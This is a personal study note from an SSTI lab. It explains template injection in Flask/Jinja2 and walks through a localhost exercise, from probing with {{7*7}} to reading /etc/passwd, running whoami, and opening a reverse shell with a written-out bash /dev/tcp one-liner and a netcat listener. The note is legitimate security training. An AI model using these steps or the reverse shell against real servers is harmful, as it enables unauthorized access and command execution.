Note title: Untitled

Wiki on SSTI 
https://infayer.com/archivos/803


**Server-Side Template Injection** (**SSTI**) is a security vulnerability where an attacker can inject malicious code into a server-side **template**.

Server-side templates are files containing code used to generate **dynamic content** (e.g., for e-commerce, personalized content based on the user) in a web application. Attackers can exploit an SSTI vulnerability to inject malicious code into a server-side template, allowing them to execute commands on the server and gain unauthorized access to both the web application and potentially sensitive data.

For example, imagine a web application uses server-side templates to generate personalized emails. An attacker could exploit an **SSTI** vulnerability to inject malicious code into the email template, enabling the attacker to execute commands on the server and gain unauthorized access to the web application's sensitive data.

In a practical case, attackers can detect if a Flask application (**Flask** is a Python **micro-framework** used to quickly and easily create web applications) is in use, for example, using tools like **WhatWeb**. If an attacker detects that a **Flask** application is in use, they may attempt to exploit an **SSTI** vulnerability, as Flask uses the **Jinja2** template engine, which is vulnerable to this type of attack.

For attackers, detecting a Flask or Python application can be a first step in the process of attempting to exploit an SSTI vulnerability. However, attackers may also attempt to identify SSTI vulnerabilities in other web applications using different template frameworks, such as Django, Ruby on Rails, among others.

To prevent SSTI attacks, web application developers must properly validate and filter user input and use secure template tools and frameworks that implement security measures to prevent malicious code injection.

**Security Note:** During audits, if you see a web application using Flask, look for **Debug Mode** enabled or **SSTI** vulnerabilities in its parameters.

**Note:** SSTI = Direct attack on the server. CSTI = When it is more client-side to potentially derive it into, for example, an XSS attack and steal the user's session.

#### Lab 
![[Pasted image 20260126181323.png]]

If we run a localhost on port 8089, we will see a web page.
![[Pasted image 20260126181511.png]]
![[Pasted image 20260126181536.png]]

Let's gather information about the content management systems and the web using WhatWeb or Wappalyzer.
![[Pasted image 20260126181706.png]]
Whenever we see Flask or Python running behind an exposed web service, we can consider SSTI vulnerabilities.

For example, if we see that we have control over the input, as in this page where what we enter in the username field is reflected back.

Let's try entering `{{7 * 7 }}`. If we get 49 in the output:
![[Pasted image 20260126182257.png]]
![[Pasted image 20260126182313.png]]
If we want to use different types of injections, we have wikis like https://github.com/swisskyrepo/PayloadsAllTheThings or https://book.hacktricks.wiki/en/index.html.

In the Git repository, we have SSTI injections for Jinja2.
![[Pasted image 20260126183307.png]]
We try different ones until we find the right one. For example, if we want to view `/etc/hosts`, we just need to change the part of the line from `/etc/passwd`.
![[Pasted image 20260126183346.png]]
![[Pasted image 20260126183440.png]]
Now we can read files from the victim server, but the importance of SSTI is that we can execute commands.
![[Pasted image 20260126183546.png]]
![[Pasted image 20260126183621.png]]
`whoami`:
![[Pasted image 20260126183643.png]]
And if we wanted to gain access to the machine, we would need to listen with netcat on port 443 and change the command to a reverse shell: `bash -i >& /dev/tcp/10.10.11.92/443 0>&1` (if we get an error, it will be due to the ampersand `&`, which needs to be URL encoded).
![[Pasted image 20260126183804.png]]
![[Pasted image 20260126184033.png]]
